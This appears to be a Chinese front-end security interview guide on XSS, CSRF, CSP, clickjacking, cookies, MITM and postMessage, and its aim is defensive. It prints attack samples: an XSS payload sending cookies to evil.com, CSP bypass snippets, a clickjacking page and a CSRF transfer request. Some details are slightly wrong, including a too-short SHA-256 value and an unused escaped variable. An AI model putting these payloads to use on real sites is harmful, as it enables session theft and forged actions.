---
title: XSS 与 CSRF
description: 前端安全面试题，覆盖 XSS 类型与防御、CSRF 原理与防护、点击劫持、中间人攻击等核心考点
---

# XSS 与 CSRF

---

> **🔥 中等 · XSS 基础**

### Q1: 什么是 XSS？有哪些类型？如何防御？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

XSS（Cross-Site Scripting，跨站脚本攻击）是攻击者向页面注入恶意脚本的攻击方式。

**三种 XSS 类型：**

| 类型 | 注入位置 | 持久性 | 攻击方式 |
|------|----------|--------|----------|
| 存储型 | 服务器数据库 | ✅ 持久 | 提交恶意内容→存储→他人浏览时执行 |
| 反射型 | URL 参数 | ❌ 非持久 | 诱骗点击恶意链接→参数反射到页面 |
| DOM 型 | 前端 JS | ❌ 非持久 | 前端 JS 直接操作 DOM 注入 |

**攻击示例：**
```js
// 存储型：在评论区注入
<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// 反射型：构造恶意 URL
https://example.com/search?q=<script>alert(1)</script>

// DOM 型：前端不安全操作
document.getElementById('output').innerHTML = location.hash.slice(1)
```

**防御方案：**

**1. 输入过滤（不能完全依赖）**
```js
// 转义 HTML 特殊字符
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
}
```

**2. 输出编码（最重要）**
```jsx
// React 默认转义（安全）
<div>{userInput}</div>

// Vue 默认转义（安全）
<div>{{ userInput }}</div>

// ❌ 危险！不要用
<div dangerouslySetInnerHTML={{ __html: userInput }} />
<div v-html="userInput"></div>
```

**3. CSP（内容安全策略）**
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'nonce-abc123'">
```

**4. HttpOnly Cookie**
```js
res.cookie('token', jwt, { httpOnly: true, secure: true, sameSite: 'strict' })
```

**知识点：** `XSS` `存储型` `反射型` `DOM 型` `CSP` `转义`

:::

---

> **🔥 中等 · CSRF 基础**

### Q2: 什么是 CSRF？攻击原理是什么？如何防御？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

CSRF（Cross-Site Request Forgery，跨站请求伪造）利用用户已登录的身份，在用户不知情的情况下发起恶意请求。

**攻击流程：**
```
1. 用户登录 bank.com，获取 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 包含：<img src="https://bank.com/transfer?to=hacker&amount=10000">
4. 浏览器自动携带 bank.com 的 Cookie
5. bank.com 认为是合法请求，执行转账
```

**防御方案：**

| 方案 | 原理 | 安全性 | 注意事项 |
|------|------|--------|----------|
| **CSRF Token** | 请求携带服务端生成的 Token | ✅ 高 | 需每个请求都带 |
| **SameSite Cookie** | 限制跨站携带 Cookie | ✅ 高 | 旧浏览器不支持 |
| **Referer 检查** | 验证请求来源 | 中 | 可被伪造/缺失 |
| **双重 Cookie** | Cookie + 请求参数都携带 | 中 | 子域有问题 |

**CSRF Token 实现：**
```js
// 服务端生成 Token
const csrfToken = crypto.randomBytes(32).toString('hex')
req.session.csrfToken = csrfToken

// 前端表单
// <input type="hidden" name="_csrf" value="{{csrfToken}}">

// Axios 拦截器
axios.defaults.headers.common['X-CSRF-Token'] = csrfToken

// 服务端验证
if (req.body._csrf !== req.session.csrfToken) {
  return res.status(403).json({ error: 'CSRF token mismatch' })
}
```

**SameSite Cookie：**
```js
// 严格模式：任何跨站请求都不带 Cookie
res.cookie('token', jwt, { sameSite: 'strict' })

// 宽松模式：顶级导航（点链接跳转）带 Cookie
res.cookie('token', jwt, { sameSite: 'lax' })

// None：允许跨站（需配合 Secure）
res.cookie('token', jwt, { sameSite: 'none', secure: true })
```

**知识点：** `CSRF` `CSRF Token` `SameSite` `Referer 检查`

:::

---

> **💀 困难 · XSS 绕过**

### Q3: CSP 如何防御 XSS？CSP 有哪些绕过方式？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**CSP 配置：**
```html
<!-- HTTP 头 -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'

<!-- Meta 标签 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

**CSP 指令说明：**

| 指令 | 说明 | 示例 |
|------|------|------|
| `default-src` | 默认策略 | `'self'` |
| `script-src` | JS 来源 | `'self' 'nonce-abc'` |
| `style-src` | CSS 来源 | `'self' 'unsafe-inline'` |
| `img-src` | 图片来源 | `'self' data: https:` |
| `connect-src` | AJAX/WebSocket | `'self' api.example.com` |
| `font-src` | 字体来源 | `'self' fonts.gstatic.com` |
| `frame-src` | iframe 来源 | `'none'` |
| `report-uri` | 违规报告 | `/csp-report` |

**CSP 绕过方式：**

**1. `unsafe-inline` 绕过**
```
script-src 'self' 'unsafe-inline'
# ← 允许内联脚本，几乎等于没设 CSP
<script>alert(1)</script>  // 可以执行
```

**2. JSONP 端点绕过**
```
script-src 'self' https://trusted.com
# 如果 trusted.com 有 JSONP：
<script src="https://trusted.com/api?callback=alert(1)"></script>
```

**3. base-uri 绕过**
```html
<!-- 没有限制 base-uri -->
<base href="https://evil.com">
<script src="/js/app.js"></script>
<!-- 实际加载 https://evil.com/js/app.js -->
```

**4. DNS 预解析绕过**
```html
<link rel="dns-prefetch" href="//evil.com">
<!-- 利用 DNS 查询泄露数据 -->
```

**最佳实践：**
```html
Content-Security-Policy: 
  default-src 'none';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-src 'none';
  base-uri 'self';
  form-action 'self';
  require-trusted-types-for 'script'
```

**知识点：** `CSP` `绕过` `nonce` `unsafe-inline` `JSONP`

:::

---

> **🔥 中等 · 点击劫持**

### Q4: 什么是点击劫持？如何防御？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**点击劫持（Clickjacking）**：攻击者用透明 iframe 覆盖在正常页面上，诱骗用户在不知情的情况下点击隐藏的按钮。

```html
<!-- 攻击页面 -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 500px;
    height: 300px;
    opacity: 0.01;  /* 几乎透明 */
    z-index: 10;
  }
</style>

<!-- 用户看到的是伪装的按钮 -->
<button style="position:absolute; top:100px; left:100px;">
  点击领取红包  <!-- 实际点击的是 iframe 中的"确认转账" -->
</button>

<!-- 透明的 iframe 加载目标网站 -->
<iframe src="https://bank.com/transfer"></iframe>
```

**防御方式：**

**1. X-Frame-Options（旧方案）**
```js
// HTTP 响应头
X-Frame-Options: DENY           // 禁止任何 iframe 嵌入
X-Frame-Options: SAMEORIGIN     // 只允许同源嵌入
X-Frame-Options: ALLOW-FROM https://trusted.com  // 已废弃
```

**2. CSP frame-ancestors（推荐）**
```js
Content-Security-Policy: frame-ancestors 'self' https://trusted.com
```

**3. JS 防御（兜底）**
```js
// 如果被 iframe 嵌入，跳出
if (window.top !== window.self) {
  window.top.location = window.self.location
}

// 或使用 CSS
html { display: none !important; }  // 默认隐藏
// 只在自己的页面中显示
if (window.top === window.self) {
  document.documentElement.style.display = 'block'
}
```

**知识点：** `点击劫持` `X-Frame-Options` `frame-ancestors`

:::

---

> **🔥 中等 · Cookie 安全**

### Q5: Cookie 有哪些安全属性？如何防止 Cookie 被窃取？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

| 属性 | 作用 | 防御 |
|------|------|------|
| `HttpOnly` | JS 无法读取 Cookie | 防 XSS 窃取 |
| `Secure` | 仅 HTTPS 传输 | 防中间人 |
| `SameSite` | 限制跨站发送 | 防 CSRF |
| `Domain` | Cookie 作用域 | 避免子域访问 |
| `Path` | Cookie 路径范围 | 限制作用范围 |
| `Expires/Max-Age` | 过期时间 | 避免永久有效 |

```js
// 安全 Cookie 设置
res.cookie('session_id', token, {
  httpOnly: true,     // 防 XSS 读取
  secure: true,       // 仅 HTTPS
  sameSite: 'strict', // 防 CSRF
  maxAge: 86400000,   // 1 天
  path: '/',
  domain: '.example.com'
})
```

**Cookie 安全最佳实践：**
- 敏感 Cookie（session/token）必须设置 `HttpOnly` + `Secure` + `SameSite`
- Session ID 应使用加密随机值，不要包含用户信息
- 设置合理的过期时间
- 使用 `__Host-` 前缀的 Cookie（无 Domain、Path=/、Secure）
- 使用 `__Secure-` 前缀的 Cookie（必须 Secure）

**知识点：** `Cookie` `HttpOnly` `Secure` `SameSite` `前缀`

:::

---

> **💀 困难 · 中间人攻击**

### Q6: 什么是中间人攻击？HTTPS 如何防止中间人攻击？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**中间人攻击（MITM）**：攻击者在客户端和服务器之间截获和篡改通信。

```
正常通信：客户端 ←→ 服务器
MITM 攻击：客户端 ←→ 攻击者 ←→ 服务器
```

**MITM 类型：**
- Wi-Fi 嗅探（咖啡店公共 WiFi）
- DNS 欺骗
- ARP 欺骗
- SSL 剥离

**HTTPS 防护原理：**

```
1. 客户端连接服务器
2. 服务器发送证书（含公钥）
3. 客户端验证证书链：
   → 证书是否由受信 CA 签发？
   → 域名是否匹配？
   → 是否在有效期内？
   → 是否被吊销（CRL/OCSP）？
4. 验证通过后，协商对称密钥
5. 使用对称密钥加密通信
```

**SSL 剥离（降级攻击）：**
```
用户输入 example.com（HTTP）
  → 攻击者拦截，自己访问 https://example.com
  → 返回 HTTP 内容给用户
  → 用户以为安全，实际被监听
```

**防御 SSL 剥离：HSTS**
```js
// 强制 HTTPS，浏览器不再尝试 HTTP
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**其他防御措施：**
- 证书固定（Certificate Pinning）
- 证书透明度（Certificate Transparency）
- DNSSEC（DNS 安全扩展）

**知识点：** `MITM` `HTTPS` `SSL 剥离` `HSTS` `证书验证`

:::

---

> **🔥 中等 · 前端安全清单**

### Q7: 前端安全防护的完整检查清单有哪些？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**1. XSS 防护**
- [ ] 所有用户输入进行转义/编码
- [ ] 避免使用 `innerHTML`/`v-html`/`dangerouslySetInnerHTML`
- [ ] 配置 CSP 头
- [ ] Cookie 设置 HttpOnly

**2. CSRF 防护**
- [ ] 使用 CSRF Token
- [ ] Cookie 设置 SameSite
- [ ] 验证 Referer/Origin

**3. 传输安全**
- [ ] 全站 HTTPS
- [ ] 配置 HSTS
- [ ] 禁用不安全的 TLS 版本（1.0/1.1）

**4. 内容安全**
- [ ] 配置 X-Frame-Options（防点击劫持）
- [ ] 配置 X-Content-Type-Options: nosniff
- [ ] 配置 X-XSS-Protection: 0（用 CSP 替代）

**5. 数据安全**
- [ ] 敏感数据不在 URL 中传递
- [ ] Token 存 httpOnly Cookie 而非 localStorage
- [ ] 定期清理 localStorage/sessionStorage

**6. 第三方安全**
- [ ] 审查第三方依赖安全性（npm audit）
- [ ] 限制第三方脚本权限
- [ ] 使用 Subresource Integrity（SRI）
```html
<script src="https://cdn.example.com/lib.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"></script>
```

**7. 输入验证**
- [ ] 白名单验证（而非黑名单）
- [ ] 限制输入长度
- [ ] 服务端验证（不信任客户端）

**知识点：** `安全清单` `CSP` `HSTS` `SRI` `输入验证`

:::

---

> **🔥 中等 · Token 安全**

### Q8: JWT 和 Session 的安全对比？Token 存储在哪里最安全？

::: details 🔍 点击查看答案与解析

#### ✅ 答案

| 对比项 | Session | JWT |
|--------|---------|-----|
| 存储位置 | 服务端 | 客户端 |
| 状态 | 有状态 | 无状态 |
| 扩展性 | 需要共享存储 | 天然支持分布式 |
| 安全撤销 | 直接删除 Session | 较难（直到过期） |
| 大小 | 短（Session ID） | 长（Token 含数据） |
| CSRF 风险 | 高（Cookie 自动携带） | 低（需手动放入 Header） |
| XSS 风险 | 低（HttpOnly Cookie） | 高（localStorage 可被读取） |

**Token 存储位置安全对比：**

| 存储位置 | XSS | CSRF | 过期管理 | 推荐度 |
|----------|-----|------|----------|--------|
| Cookie (httpOnly) | ✅ 安全 | ❌ 有风险 | ✅ 服务端控制 | ⭐⭐⭐⭐⭐ |
| localStorage | ❌ 可被读取 | ✅ 安全 | ❌ 手动管理 | ⭐⭐⭐ |
| sessionStorage | ❌ 可被读取 | ✅ 安全 | ❌ 标签页关闭 | ⭐⭐⭐ |
| 内存（state/redux） | ❌ 可被读取 | ✅ 安全 | ❌ 刷新丢失 | ⭐⭐ |

**推荐方案：双 Token 策略**
```js
// Access Token：短期（15min），存内存
// Refresh Token：长期（7 天），存 httpOnly Cookie

// 登录
app.post('/login', (req, res) => {
  const accessToken = jwt.sign({ userId }, SECRET, { expiresIn: '15m' })
  const refreshToken = jwt.sign({ userId }, REFRESH_SECRET, { expiresIn: '7d' })
  
  // Access Token 通过响应体返回（不存 Cookie）
  res.json({ accessToken })
  
  // Refresh Token 存 httpOnly Cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api/auth/refresh'  // 只在刷新接口发送
  })
})

// 刷新 Token
app.post('/api/auth/refresh', (req, res) => {
  const { refreshToken } = req.cookies
  // 验证并签发新的 Access Token
})
```

**知识点：** `JWT` `Session` `双 Token` `httpOnly` `Refresh Token`

:::

---

### Q9: DOM 型 XSS 是什么？和反射型/存储型 XSS 的区别？

> **🔥 中等 · 安全**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**三种 XSS 类型对比：**

| 类型 | 注入点 | 存储 | 触发时机 | 防御重点 |
|------|--------|------|----------|----------|
| **存储型** | 服务器数据库 | ✅ 持久 | 任何用户访问页面 | 服务端输入过滤 |
| **反射型** | URL 参数 | ❌ 不存储 | 用户点击恶意链接 | 输出编码 |
| **DOM 型** | 前端 JavaScript | ❌ 不存储 | 前端 JS 执行时 | 前端 DOM 操作安全 |

**DOM 型 XSS 原理：**

```
恶意链接：https://example.com/#<script>alert(1)</script>

前端代码：
document.getElementById('title').innerHTML = location.hash.slice(1)
// 危险！直接执行了 hash 中的脚本
```

**常见 DOM XSS 攻击向量：**

```js
// 1. location.hash
element.innerHTML = location.hash.slice(1)

// 2. location.search
const name = new URLSearchParams(location.search).get('name')
document.write('<h1>' + name + '</h1>')

// 3. document.referrer
welcome.innerHTML = '来自 ' + document.referrer

// 4. window.name
element.innerText = window.name

// 5. postMessage
window.addEventListener('message', (e) => {
  document.innerHTML = e.data  // 危险！
})

// 6. 定时器（payload 延迟执行）
setTimeout('alert("XSS")', 1000)  // 字符串参数会被 eval
```

**DOM XSS 案例：**

```html
<!-- 搜索页面：search.html?q=<img src=x onerror=alert(1)> -->
<script>
  // 危险写法
  const query = new URLSearchParams(location.search).get('q')
  document.write('<div>搜索结果：' + query + '</div>')
  
  // 安全写法
  const safeQuery = query
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
  document.getElementById('result').textContent = '搜索结果：' + query
</script>
```

**防御方案：**

```js
// ✅ 安全 DOM 操作
element.textContent = userInput  // 自动转义
element.setAttribute('href', url)  // 验证 URL 协议

// ❌ 危险 DOM 操作
element.innerHTML = userInput
element.outerHTML = userInput
document.write(userInput)
setTimeout(userInput, 1000)  // 字符串形式
eval(userInput)

// ✅ 使用安全库
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userInput)
```

**知识点:**`DOM XSS` `XSS 类型` `前端安全` `DOMPurify`

:::

---

### Q10: CSP 的常用指令有哪些？nonce 和 hash 的区别？

> **🔥 中等 · 安全**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**CSP 常用指令：**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'self';
  base-uri 'self';
  form-action 'self';
  report-uri /csp-report;
```

**指令详解：**

| 指令 | 作用 | 常用值 |
|------|------|--------|
| `default-src` | 默认策略，其他指令未设置时生效 | `'self'` `'none'` |
| `script-src` | JS 脚本来源 | `'self'` `'nonce-xxx'` `'sha256-xxx'` |
| `style-src` | CSS 样式来源 | `'self'` `'unsafe-inline'` |
| `img-src` | 图片/图标来源 | `'self'` `data:` `https:` |
| `font-src` | 字体来源 | `'self'` `https://fonts.gstatic.com` |
| `connect-src` | AJAX/WebSocket/URL 来源 | `'self'` API 域名 |
| `frame-src` | iframe 来源 | `'none'` `'self'` |
| `frame-ancestors` | 哪些页面可以用 iframe 嵌入此页面 | `'none'` `'self'` |
| `base-uri` | 限制 `<base>` 标签 | `'self'` `'none'` |
| `form-action` | 表单提交目标 | `'self'` |
| `upgrade-insecure-requests` | 强制 HTTPS | - |
| `report-uri` | 违规报告地址 | `/csp-report` |
| `require-trusted-types-for` | 启用 Trusted Types | `'script'` |

**nonce vs hash 对比：**

| 特性 | nonce | hash |
|------|-------|------|
| 原理 | 随机字符串，每次请求不同 | 脚本内容的 SHA256 哈希 |
| 配置 | 服务端每次生成随机值 | 提前计算脚本 hash，固定不变 |
| 适用 | 内联脚本、动态脚本 | 静态内联脚本 |
| 维护 | 无需更新 | 脚本内容变化需重新计算 |
| 安全性 | 高（不可预测） | 高（内容绑定） |

**nonce 使用示例：**

```js
// 服务端（Express）
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64')
  res.locals.nonce = nonce
  res.setHeader('Content-Security-Policy', 
    `script-src 'self' 'nonce-${nonce}'`)
  next()
})

// 模板（EJS）
<script nonce="<%= nonce %>">
  console.log('安全内联脚本')
</script>
```

**hash 使用示例：**

```bash
# 计算脚本的 SHA256
echo -n "console.log('hello')" | openssl dgst -sha256 -binary | base64
# 输出：9McbM4wJz25VTf+nQPb0OkLa6P8=

# CSP 头
script-src 'self' 'sha256-9McbM4wJz25VTf+nQPb0OkLa6P8='
```

```html
<!-- 只有这个脚本能被执行 -->
<script>console.log('hello')</script>
```

**最佳实践：**

```
# 推荐配置
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' data: blob: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://fonts.gstatic.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  require-trusted-types-for 'script';
  report-uri /csp-report
```

**知识点:**`CSP` `nonce` `hash` `内容安全策略`

:::

---

### Q11: 跨窗口通信的安全风险？postMessage 的安全使用方式？

> **🔥 困难 · 安全**

::: details 🔍 点击查看答案与解析

#### ✅ 答案

**跨窗口通信方式：**

| 方式 | 同源 | 跨域 | 安全性 |
|------|------|------|--------|
| `window.postMessage` | ✅ | ✅ | ⭐⭐⭐⭐（需验证） |
| `localStorage` | ✅ | ❌ | ⭐⭐⭐（同源即可） |
| `window.name` | ✅ | ✅ | ⭐⭐（数据可伪造） |
| `fragment`（URL #） | ✅ | ✅ | ⭐⭐（需轮询） |
| `Channel Messaging` | ✅ | ✅ | ⭐⭐⭐⭐（现代方案） |

**postMessage 安全风险：**

```js
// ❌ 危险：不验证来源
window.addEventListener('message', (event) => {
  // 任意网站都可以发消息
  doSomething(event.data)
})

// ❌ 危险：使用 * 发送
otherWindow.postMessage(data, '*')

// ❌ 危险：不验证数据格式
if (event.data) {
  document.body.innerHTML = event.data  // XSS！
}
```

**postMessage 安全使用：**

```js
// 1. 发送方：指定目标 origin
const targetOrigin = 'https://trusted-iframe.com'
iframe.contentWindow.postMessage(data, targetOrigin)

// 2. 接收方：验证来源
window.addEventListener('message', (event) => {
  // 验证来源
  if (event.origin !== 'https://trusted-iframe.com') {
    console.warn('Invalid origin:', event.origin)
    return
  }
  
  // 验证数据来源（frame 身份）
  if (event.source !== iframe.contentWindow) {
    return
  }
  
  // 验证数据格式
  if (!isValidMessage(event.data)) {
    return
  }
  
  // 安全处理
  handleMessage(event.data)
})

// 3. 握手认证（增强安全）
function sendAuthenticatedMessage(target, data, secret) {
  const message = {
    data: data,
    signature: HMAC(data, secret),
    timestamp: Date.now()
  }
  target.postMessage(message, allowedOrigin)
}

function verifyMessage(message, secret) {
  // 验证签名
  const expected = HMAC(message.data, secret)
  if (message.signature !== expected) return false
  
  // 验证时间戳（防重放，30 秒内有效）
  if (Date.now() - message.timestamp > 30000) return false
  
  return true
}
```

**Channel Messaging（更安全）：**

```js
// 创建消息通道
const channel = new MessageChannel()

// 发送方
iframe.contentWindow.postMessage({ type: 'init' }, '*', [channel.port2])
channel.port1.postMessage(data)

// 接收方
window.addEventListener('message', (event) => {
  if (event.data?.type === 'init') {
    const port = event.ports[0]
    port.onmessage = (e) => {
      // 通过端口通信，更安全
      console.log('Received:', e.data)
      port.postMessage({ status: 'ok' })
    }
  }
})
```

**实际场景 - 跨域 iframe 通信：**

```js
// 父页面
const iframe = document.getElementById('payment')

// 发送订单数据
function sendOrder(orderData) {
  iframe.contentWindow.postMessage({
    type: 'ORDER_DATA',
    data: orderData,
    nonce: generateNonce()
  }, 'https://payment.example.com')
}

// 接收支付结果
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://payment.example.com') return
  
  if (event.data?.type === 'PAYMENT_RESULT') {
    // 验证 nonce 防重放
    if (verifyNonce(event.data.nonce)) {
      handlePaymentResult(event.data.result)
    }
  }
})
```

**知识点:**`postMessage` `跨域通信` `消息验证` `Channel Messaging`

:::